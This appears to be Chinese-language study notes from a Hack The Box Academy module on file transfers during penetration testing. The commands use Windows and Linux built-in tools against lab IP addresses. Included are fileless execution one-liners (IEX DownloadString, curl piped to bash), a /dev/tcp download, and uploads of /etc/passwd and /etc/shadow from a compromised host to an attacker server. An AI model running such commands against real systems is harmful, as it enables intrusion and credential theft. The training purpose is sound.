现在我们可以使用 PowerShell 脚本 [PSUpload.ps1](https://github.com/juliourena/plaintext/blob/master/Powershell/PSUpload.ps1)，它使用 `Invoke-WebRequest` 执行上传操作。该脚本接受两个参数 `-File`（用于指定文件路径）和 `-Uri`（我们将上传文件的服务器 URL）。让我们尝试从 Windows 主机上传 hosts 文件。

#### 将文件上传到 Python 上传服务器的 PowerShell 脚本

PowerShell Script to Upload a File to Python Upload Server

```powershell-session
PS C:\htb> IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/PSUpload.ps1')
PS C:\htb> Invoke-FileUpload -Uri http://192.168.49.128:8000/upload -File C:\Windows\System32\drivers\etc\hosts

[+] File Uploaded:  C:\Windows\System32\drivers\etc\hosts
[+] FileHash:  5E7241D66FD77E9E8EA866B6278B2373
```

### PowerShell Base64 Web 上传

另一种使用 PowerShell 和 base64 编码文件进行上传操作的方法是将 `Invoke-WebRequest` 或 `Invoke-RestMethod` 与 Netcat 一起使用。我们使用 Netcat 监听我们指定的端口，并将文件作为 `POST` 请求发送。最后，我们复制输出并使用 base64 解码函数将 base64 字符串转换为文件。

PowerShell Script to Upload a File to Python Upload Server

```powershell-session
PS C:\htb> $b64 = [System.convert]::ToBase64String((Get-Content -Path 'C:\Windows\System32\drivers\etc\hosts' -Encoding Byte))
PS C:\htb> Invoke-WebRequest -Uri http://192.168.49.128:8000/ -Method POST -Body $b64
```

我们用 Netcat 捕获 base64 数据，并使用带有解码选项的 base64 应用程序将字符串转换为文件。

PowerShell Script to Upload a File to Python Upload Server

```shell-session
tr01ax@htb[/htb]$ nc -lvnp 8000

listening on [any] 8000 ...
connect to [192.168.49.128] from (UNKNOWN) [192.168.49.129] 50923
POST / HTTP/1.1
User-Agent: Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) WindowsPowerShell/5.1.19041.1682
Content-Type: application/x-www-form-urlencoded
Host: 192.168.49.128:8000
Content-Length: 1820
Connection: Keep-Alive

IyBDb3B5cmlnaHQgKGMpIDE5OTMtMjAwOSBNaWNyb3NvZnQgQ29ycC4NCiMNCiMgVGhpcyBpcyBhIHNhbXBsZSBIT1NUUyBmaWxlIHVzZWQgYnkgTWljcm9zb2Z0IFRDUC9JUCBmb3IgV2luZG93cy4NCiMNCiMgVGhpcyBmaWxlIGNvbnRhaW5zIHRoZSBtYXBwaW5ncyBvZiBJUCBhZGRyZXNzZXMgdG8gaG9zdCBuYW1lcy4gRWFjaA0KIyBlbnRyeSBzaG91bGQgYmUga2VwdCBvbiBhbiBpbmRpdmlkdWFsIGxpbmUuIFRoZSBJUCBhZGRyZXNzIHNob3VsZA0KIyBiZSBwbGFjZWQgaW4gdGhlIGZpcnN0IGNvbHVtbiBmb2xsb3dlZCBieSB0aGUgY29ycmVzcG9uZGluZyBob3N0IG5hbWUuDQojIFRoZSBJUCBhZGRyZXNzIGFuZCB0aGUgaG9zdCBuYW1lIHNob3VsZCBiZSBzZXBhcmF0ZWQgYnkgYXQgbGVhc3Qgb25lDQo
...SNIP...
```

PowerShell Script to Upload a File to Python Upload Server

```shell-session
tr01ax@htb[/htb]$ echo <base64> | base64 -d -w 0 > hosts
```

---

## SMB 上传

^84ecfb

我们之前讨论过，公司通常允许使用 `HTTP` (TCP/80) 和 `HTTPS` (TCP/443) 协议的出站流量。通常企业不允许 SMB 协议 (TCP/445) 离开其内部网络，因为这可能使他们面临潜在的攻击。有关更多信息，我们可以阅读 Microsoft 的文章[防止 SMB 流量从横向连接进入或离开网络](https://support.microsoft.com/en-us/topic/preventing-smb-traffic-from-lateral-connections-and-entering-or-leaving-the-network-c0541db7-2244-0dce-18fd-14a3ddeb282a)。

一种替代方案是使用 `WebDav` 在 HTTP 上运行 SMB。`WebDAV` [(RFC 4918)](https://datatracker.ietf.org/doc/html/rfc4918) 是 HTTP 的扩展，HTTP 是 Web 浏览器和 Web 服务器用来相互通信的互联网协议。`WebDAV` 协议使 Web 服务器能够像文件服务器一样运行，支持协作内容创作。`WebDAV` 也可以使用 HTTPS。

当您使用 `SMB` 时，它会首先尝试使用 SMB 协议连接，如果没有可用的 SMB 共享，它会尝试使用 HTTP 连接。在以下 Wireshark 捕获中，我们尝试连接到文件共享 `testing3`，因为没有找到任何 `SMB` 内容，所以它使用了 `HTTP`。

![Image](https://academy.hackthebox.com/storage/modules/24/smb-webdav-wireshark.png)

#### 配置 WebDav 服务器

要设置我们的 WebDav 服务器，我们需要安装两个 Python 模块，`wsgidav` 和 `cheroot`（您可以在此处阅读有关此实现的更多信息：[wsgidav github](https://github.com/mar10/wsgidav)）。安装后，我们在目标目录中运行 `wsgidav` 应用程序。

#### 安装 WebDav Python 模块

Installing WebDav Python modules

```shell-session
```shell-session
tr01ax@htb[/htb]$ sudo pip install wsgidav cheroot

[sudo] password for plaintext:
Collecting wsgidav
  Downloading WsgiDAV-4.0.1-py3-none-any.whl (171 kB)
     |████████████████████████████████| 171 kB 1.4 MB/s
     ...SNIP...
```

#### 使用 WebDav Python 模块

使用 WebDav Python 模块

```shell-session
tr01ax@htb[/htb]$ sudo wsgidav --host=0.0.0.0 --port=80 --root=/tmp --auth=anonymous

[sudo] password for plaintext:
Running without configuration file.
10:02:53.949 - WARNING : App wsgidav.mw.cors.Cors(None).is_disabled() returned True: skipping.
10:02:53.950 - INFO    : WsgiDAV/4.0.1 Python/3.9.2 Linux-5.15.0-15parrot1-amd64-x86_64-with-glibc2.31
10:02:53.950 - INFO    : Lock manager:      LockManager(LockStorageDict)
10:02:53.950 - INFO    : Property manager:  None
10:02:53.950 - INFO    : Domain controller: SimpleDomainController()
10:02:53.950 - INFO    : Registered DAV providers by route:
10:02:53.950 - INFO    :   - '/:dir_browser': FilesystemProvider for path '/usr/local/lib/python3.9/dist-packages/wsgidav/dir_browser/htdocs' (Read-Only) (anonymous)
10:02:53.950 - INFO    :   - '/': FilesystemProvider for path '/tmp' (Read-Write) (anonymous)
10:02:53.950 - WARNING : Basic authentication is enabled: It is highly recommended to enable SSL.
10:02:53.950 - WARNING : Share '/' will allow anonymous write access.
10:02:53.950 - WARNING : Share '/:dir_browser' will allow anonymous read access.
10:02:54.194 - INFO    : Running WsgiDAV/4.0.1 Cheroot/8.6.0 Python 3.9.2
10:02:54.194 - INFO    : Serving on http://0.0.0.0:80 ...
```

#### 连接到 Webdav 共享

现在我们可以尝试使用 `DavWWWRoot` 目录连接到共享。

连接到 Webdav 共享

```cmd-session
C:\htb> dir \\192.168.49.128\DavWWWRoot

 Volume in drive \\192.168.49.128\DavWWWRoot has no label.
 Volume Serial Number is 0000-0000

 Directory of \\192.168.49.128\DavWWWRoot

05/18/2022  10:05 AM    <DIR>          .
05/18/2022  10:05 AM    <DIR>          ..
05/18/2022  10:05 AM    <DIR>          sharefolder
05/18/2022  10:05 AM                13 filetest.txt
               1 File(s)             13 bytes
               3 Dir(s)  43,443,318,784 bytes free
```

**注意：** `DavWWWRoot` 是 Windows Shell 识别的特殊关键字。您的 WebDAV 服务器上实际上不存在这个文件夹。DavWWWRoot 关键字告诉处理 WebDAV 请求的 Mini-Redirector（迷你重定向器）驱动程序，您正在连接到 WebDAV 服务器的根目录。

如果在连接服务器时指定服务器上存在的文件夹，则可以避免使用此关键字。例如：\\192.168.49.128\sharefolder

#### 使用 SMB 上传文件

使用 SMB 上传文件

```cmd-session
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
C:\htb> copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

**注意：** 如果没有 SMB (TCP/445) 限制，您可以像设置下载操作一样使用 impacket-smbserver。

---

## FTP 上传

使用 FTP 上传文件与下载文件非常相似。我们可以使用 PowerShell 或 FTP 客户端来完成操作。在使用 Python 模块 `pyftpdlib` 启动 FTP 服务器之前，我们需要指定 `--write` 选项以允许客户端将文件上传到我们的攻击主机。

使用 SMB 上传文件

```shell-session
tr01ax@htb[/htb]$ sudo python3 -m pyftpdlib --port 21 --write

/usr/local/lib/python3.9/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  warnings.warn("write permissions assigned to anonymous user.",
[I 2022-05-18 10:33:31] concurrency model: async
[I 2022-05-18 10:33:31] masquerade (NAT) address: None
[I 2022-05-18 10:33:31] passive ports: None
[I 2022-05-18 10:33:31] >>> starting FTP server on 0.0.0.0:21, pid=5155 <<<
```

现在让我们使用 PowerShell 上传功能将文件上传到我们的 FTP 服务器。

#### PowerShell 上传文件

PowerShell 上传文件

```powershell-session
PS C:\htb> (New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

#### 为 FTP 客户端创建上传文件的命令文件

为 FTP 客户端创建上传文件的命令文件

```cmd-session
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```

---

## 回顾

我们讨论了使用 Windows 原生工具下载和上传文件的几种方法，但还有更多。在接下来的章节中，我们将讨论其他可用于执行文件传输操作的机制和工具。#linux #filetransfer #hacking #curl #wget
[source ](https://academy.hackthebox.com/module/24/section/514)

---

Linux 是一个多功能的操作系统，通常有许多不同的工具可用于执行文件传输。理解 Linux 中的文件传输方法可以帮助攻击者和防御者提高攻击网络和防止复杂攻击的技能。

几年前，我们被联系执行一些 Web 服务器的事件响应。我们在调查的九台 Web 服务器中的六台发现了多个威胁行为者。威胁行为者发现了一个 SQL 注入漏洞。他们使用了一个 Bash 脚本，执行时会尝试下载另一个连接到威胁行为者命令和控制服务器的恶意软件。

他们使用的 Bash 脚本尝试了三种下载方法来获取连接到命令和控制服务器的另一个恶意软件。第一次尝试使用 `cURL`。如果失败，则尝试使用 `wget`，如果那也失败，则使用 `Python`。所有三种方法都使用 `HTTP` 进行通信。

虽然 Linux 可以像 Windows 一样通过 FTP、SMB 进行通信，但所有不同操作系统上的大多数恶意软件都使用 `HTTP` 和 `HTTPS` 进行通信。

本节将回顾在 Linux 上传输文件的多种方式，包括 HTTP、Bash、SSH 等。

---

## 下载操作

我们可以访问机器 `NIX04`，需要从我们的 `Pwnbox` 机器下载一个文件。让我们看看如何使用多种文件下载方法来完成这个任务。

![image](https://academy.hackthebox.com/storage/modules/24/LinuxDownloadUpload.drawio.png)

## Base64 编码/解码

根据我们要传输的文件大小，我们可以使用一种不需要网络通信的方法。如果我们可以访问终端，我们可以将文件编码为 base64 字符串，将其内容复制到终端中并执行反向操作。让我们看看如何使用 Bash 完成这个操作。

#### Pwnbox - 检查文件 MD5 哈希值

Pwnbox - 检查文件 MD5 哈希值

```shell-session
tr01ax@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

我们使用 `cat` 打印文件内容，并使用管道 `|` 对输出进行 base64 编码。我们使用 `-w 0` 选项只创建一行，并以分号 (;) 和 `echo` 关键字结束命令以开始新行，使其更容易复制。

#### Pwnbox - 将 SSH 密钥编码为 Base64

Pwnbox - 将 SSH 密钥编码为 Base64

```shell-session
tr01ax@htb[/htb]$ cat id_rsa |base64 -w 0;echo

LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=
```

我们复制此内容，将其粘贴到我们的 Linux 目标机器上，并使用带有 `-d` 选项的 `base64` 进行解码。

#### Linux - 解码文件

Linux - 解码文件

```shell-session
tr01ax@htb[/htb]$ echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa
```

最后，我们可以使用 `md5sum` 命令确认文件是否传输成功。

#### Linux - 确认 MD5 哈希值匹配

Linux - 确认 MD5 哈希值匹配

```shell-session
tr01ax@htb[/htb]$ md5sum id_rsa

4e301756a07ded0a2dd6953abf015278  id_rsa
```

**注意：** 您也可以使用反向操作上传文件。从您的已入侵目标机器上使用 cat 和 base64 编码文件，然后在您的 Pwnbox 上解码它。

## 使用 Wget 和 cURL 进行 Web 下载

与 Web 应用程序交互的两个最常见的 Linux 发行版实用程序是 `wget` 和 `curl`。这些工具安装在许多 Linux 发行版中。

要使用 `wget` 下载文件，我们需要指定 URL 和 `-O` 选项来设置输出文件名。

#### 使用 wget 下载文件

使用 wget 下载文件

```shell-session
tr01ax@htb[/htb]$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

`cURL` 与 `wget` 非常相似，但输出文件名选项是小写的 `-o`。

#### 使用 cURL 下载文件

使用 cURL 下载文件

```shell-session
tr01ax@htb[/htb]$ curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

---

## 使用 Linux 进行无文件攻击

由于 Linux 的工作方式以及[管道的操作原理](https://www.geeksforgeeks.org/piping-in-unix-or-linux/)，我们在 Linux 中使用的大多数工具都可以用于复制无文件操作，这意味着我们不必下载文件就可以执行它。

**注意：** 某些有效载荷（如 `mkfifo`）会将文件写入磁盘。请记住，虽然使用管道时有效载荷的执行可能是无文件的，但根据选择的有效载荷，它可能会在操作系统上创建临时文件。

让我们使用我们使用过的 `cURL` 命令，不下载 LinEnum.sh，而是使用管道直接执行它。

#### 使用 cURL 进行无文件下载

使用 cURL 进行无文件下载

```shell-session
tr01ax@htb[/htb]$ curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

类似地，我们可以从 Web 服务器下载 Python 脚本文件并将其管道传输到 Python 二进制文件。让我们这样做，这次使用 `wget`。

#### 使用 wget 进行无文件下载

使用 wget 进行无文件下载

```shell-session
tr01ax@htb[/htb]$ wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3

Hello World!
```

---

## 使用 Bash 下载（/dev/tcp）

在某些情况下，可能没有已知的文件传输工具可用。只要安装了 Bash 2.04 或更高版本（使用 --enable-net-redirections 编译），就可以使用内置的 /dev/TCP 设备文件进行简单的文件下载。

#### 连接到目标 Web 服务器

连接到目标 Web 服务器

```shell-session
tr01ax@htb[/htb]$ exec 3<>/dev/tcp/10.10.10.32/80
```

#### HTTP GET 请求

HTTP GET 请求

```shell-session
tr01ax@htb[/htb]$ echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

#### 打印响应

打印响应

```shell-session
tr01ax@htb[/htb]$ cat <&3
```

---

## SSH 下载

SSH（或安全外壳协议）是一种允许安全访问远程计算机的协议。SSH 实现带有 `SCP` 实用程序用于远程文件传输，默认情况下使用 SSH 协议。

`SCP`（安全复制）是一个命令行实用程序，允许您在两台主机之间安全地复制文件和目录。我们可以将文件从本地复制到远程服务器，也可以从远程服务器复制到本地机器。

`SCP` 与 `copy` 或 `cp` 非常相似，但我们不是提供本地路径，而是需要指定用户名、远程 IP 地址或 DNS 名称以及用户的凭据。

在我们开始从目标 Linux 机器下载文件到我们的 Pwnbox 之前，让我们在 Pwnbox 中设置一个 SSH 服务器。

#### 启用 SSH 服务器

启用 SSH 服务器

```shell-session
tr01ax@htb[/htb]$ sudo systemctl enable ssh

Synchronizing state of ssh.service with SysV service script with /lib/systemd/systemd-sysv-install.
Executing: /lib/systemd/systemd-sysv-install enable ssh
Use of uninitialized value $service in hash element at /usr/sbin/update-rc.d line 26, <DATA> line 45
...SNIP...
```

#### 启动 SSH 服务器

启动 SSH 服务器

```shell-session
tr01ax@htb[/htb]$ sudo systemctl start ssh
```

#### 检查 SSH 监听端口

检查 SSH 监听端口

```shell-session
tr01ax@htb[/htb]$ netstat -lnpt

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
```

现在我们可以开始传输文件了。我们需要指定 Pwnbox 的 IP 地址以及用户名和密码。

#### Linux - 使用 SCP 下载文件

Linux - 使用 SCP 下载文件

```shell-session
tr01ax@htb[/htb]$ scp plaintext@192.168.49.128:/root/myroot.txt .
```

**注意：** 您可以创建一个临时用户账户用于文件传输，避免在远程计算机上使用您的主要凭据或密钥。

---

## 上传操作

在某些情况下，例如二进制利用和数据包捕获分析，我们必须将文件从目标机器上传到我们的攻击主机。我们用于下载的方法同样适用于上传。让我们看看如何以各种方式上传文件。

---

## Web 上传

如 `Windows 文件传输方法` 部分所述，我们可以使用 [uploadserver](https://github.com/Densaugeo/uploadserver)，这是 Python `HTTP.Server` 模块的扩展模块，包含文件上传页面。对于这个 Linux 示例，让我们看看如何配置 `uploadserver` 模块以使用 `HTTPS` 进行安全通信。

我们需要做的第一件事是安装 `uploadserver` 模块。

#### Pwnbox - 启动 Web 服务器

Pwnbox - 启动 Web 服务器

```shell-session
tr01ax@htb[/htb]$ sudo python3 -m pip install --user uploadserver

Collecting uploadserver
  Using cached uploadserver-2.0.1-py3-none-any.whl (6.9 kB)
Installing collected packages: uploadserver
Successfully installed uploadserver-2.0.1
```

现在我们需要创建证书。在此示例中，我们使用自签名证书。

#### Pwnbox - 创建自签名证书

Pwnbox - 创建自签名证书

```shell-session
tr01ax@htb[/htb]$ openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'

Generating a RSA private key
................................................................................+++++
.......+++++
writing new private key to 'server.pem'
-----
```

Web 服务器不应托管证书。我们建议创建一个新目录来托管我们 Web 服务器的文件。

#### Pwnbox - 启动 Web 服务器

Pwnbox - 启动 Web 服务器

```shell-session
tr01ax@htb[/htb]$ mkdir https && cd https
```

Pwnbox - 启动 Web 服务器

```shell-session
tr01ax@htb[/htb]$ sudo python3 -m uploadserver 443 --server-certificate /root/server.pem

File upload available at /upload
Serving HTTPS on 0.0.0.0 port 443 (https://0.0.0.0:443/) ...
```

现在从我们的已入侵机器上，让我们上传 `/etc/passwd` 和 `/etc/shadow` 文件。

#### Linux - 上传多个文件

Linux - 上传多个文件

```shell-session
tr01ax@htb[/htb]$ curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

我们使用了 `--insecure` 选项，因为我们使用了我们信任的自签名证书。

---

## 替代 Web 文件传输方法

由于 Linux 发行版通常安装了 `Python` 或 `php`，启动 Web 服务器传输文件非常简单。此外，如果我们入侵的服务器是 Web 服务器，我们可以将要传输的文件移动到 Web 服务器目录并从网页访问它们，这意味着我们正在从我们的 Pwnbox 下载文件。

使用各种语言可以搭建 Web 服务器。被入侵的 Linux 机器可能没有安装 Web 服务器。在这种情况下，我们可以使用迷你 Web 服务器。它们可能在安全性方面有所欠缺，但在灵活性方面弥补了这一点，因为可以快速更改 webroot 位置和监听端口。

#### Linux - 使用 Python3 创建 Web 服务器

Linux - 使用 Python3 创建 Web 服务器

```shell-session
tr01ax@htb[/htb]$ python3 -m http.server

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

#### Linux - 使用 Python2.7 创建 Web 服务器

Linux - 使用 Python2.7 创建 Web 服务器

```shell-session
tr01ax@htb[/htb]$ python2.7 -m SimpleHTTPServer

Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

#### Linux - 使用 PHP 创建 Web 服务器

Linux - 使用 PHP 创建 Web 服务器

```shell-session
tr01ax@htb[/htb]$ php -S 0.0.0.0:8000

[Fri May 20 08:16:47 2022] PHP 7.4.28 Development Server (http://0.0.0.0:8000) started
```

#### Linux - 使用 Ruby 创建 Web 服务器

Linux - 使用 Ruby 创建 Web 服务器

```shell-session
tr01ax@htb[/htb]$ ruby -run -ehttpd . -p8000

[2022-05-23 09:35:46] INFO  WEBrick 1.6.1
[2022-05-23 09:35:46] INFO  ruby 2.7.4 (2021-07-07) [x86_64-linux-gnu]
[2022-05-23 09:35:46] INFO  WEBrick::HTTPServer#start: pid=1705 port=8000
```

#### 从目标机器下载文件到 Pwnbox

从目标机器下载文件到 Pwnbox

```shell-session
tr01ax@htb[/htb]$ wget 192.168.49.128:8000/filetotransfer.txt

--2022-05-20 08:13:05--  http://192.168.49.128:8000/filetotransfer.txt
Connecting to 192.168.49.128:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 0 [text/plain]
Saving to: 'filetotransfer.txt'

filetotransfer.txt                       [ <=>                                                                  ]       0  --.-KB/s    in 0s

2022-05-20 08:13:05 (0.00 B/s) - 'filetotransfer.txt' saved [0/0]
```

**注意：** 当我们使用 Python 或 PHP 启动新的 Web 服务器时，重要的是要考虑入站流量可能被阻止。我们正在将文件从目标传输到我们的攻击主机，但我们并不是在上传文件。

---

## SCP 上传

我们可能会发现一些公司允许 `SSH 协议` (TCP/22) 进行出站连接，如果是这种情况，我们可以使用 SSH 服务器和 `scp` 实用程序来上传文件。让我们尝试使用 SSH 协议上传文件。

#### 使用 SCP 上传文件

使用 SCP 上传文件

```shell-session
tr01ax@htb[/htb]$ scp /etc/passwd plaintext@192.168.49.128:/home/plaintext/

plaintext@192.168.49.128's password:
passwd                                                                                                           100% 3414     6.7MB/s   00:00
```
**注意:** 请记住 scp 的语法与 cp 或 copy 类似。

---

## 继续前进

这些是使用 Linux 系统内置工具进行文件传输的最常见方法，但还有更多方法。在接下来的章节中，我们将讨论可用于执行文件传输操作的其他机制和工具。#python #perl #hacking #filetransfer #javascript #vbscript
[source](https://academy.hackthebox.com/module/24/section/1574)

我们经常会发现目标机器上安装了不同的编程语言。Python、PHP、Perl 和 Ruby 等编程语言通常在 Linux 发行版中可用，但也可以安装在 Windows 上，尽管这种情况要少得多。

我们可以使用一些 Windows 默认应用程序，如 `cscript` 和 `mshta`，来执行 JavaScript 或 VBScript 代码。JavaScript 也可以在 Linux 主机上运行。

根据维基百科的记录，大约有 [700 种编程语言](https://en.wikipedia.org/wiki/List_of_programming_languages)，我们可以使用任何编程语言创建代码，来下载、上传或向操作系统执行指令。本节将提供一些使用常见编程语言的示例。

---

## Python

Python 是一种流行的编程语言。目前支持版本 3，但我们可能会发现某些服务器上仍然存在 Python 2.7 版本。`Python` 可以使用 `-c` 选项从操作系统命令行运行单行命令。让我们看一些示例：

#### Python 2 - 下载

Python 2 - 下载

```shell-session
tr01ax@htb[/htb]$ python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

#### Python 3 - 下载

Python 3 - 下载

```shell-session
tr01ax@htb[/htb]$ python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

---

## PHP

`PHP` 也非常流行，并提供多种文件传输方法。[根据 W3Techs 的数据](https://w3techs.com/technologies/details/pl-php)，PHP 被 77.4% 的已知服务器端编程语言的网站使用。虽然这个信息不够精确，实际数字可能略低，但在进行攻击性操作时，我们经常会遇到使用 PHP 的 Web 服务。

让我们看一些使用 PHP 下载文件的示例。

在以下示例中，我们将使用 PHP [file_get_contents() 模块](https://www.php.net/manual/en/function.file-get-contents.php) 从网站下载内容，并结合 [file_put_contents() 模块](https://www.php.net/manual/en/function.file-put-contents.php) 将文件保存到目录中。`PHP` 可以使用 `-r` 选项从操作系统命令行运行单行命令。

#### 使用 File_get_contents() 的 PHP 下载

使用 File_get_contents() 的 PHP 下载

```shell-session
tr01ax@htb[/htb]$ php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

`file_get_contents()` 和 `file_put_contents()` 的替代方案是 [fopen() 模块](https://www.php.net/manual/en/function.fopen.php)。我们可以使用此模块打开 URL，读取其内容并保存到文件中。

#### 使用 Fopen() 的 PHP 下载

使用 Fopen() 的 PHP 下载

```shell-session
tr01ax@htb[/htb]$ php -r 'const BUFFER = 1024; $fremote =
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

---

我们还可以将下载的内容发送到管道，类似于我们在上一节中使用 cURL 和 wget 执行的无文件示例。

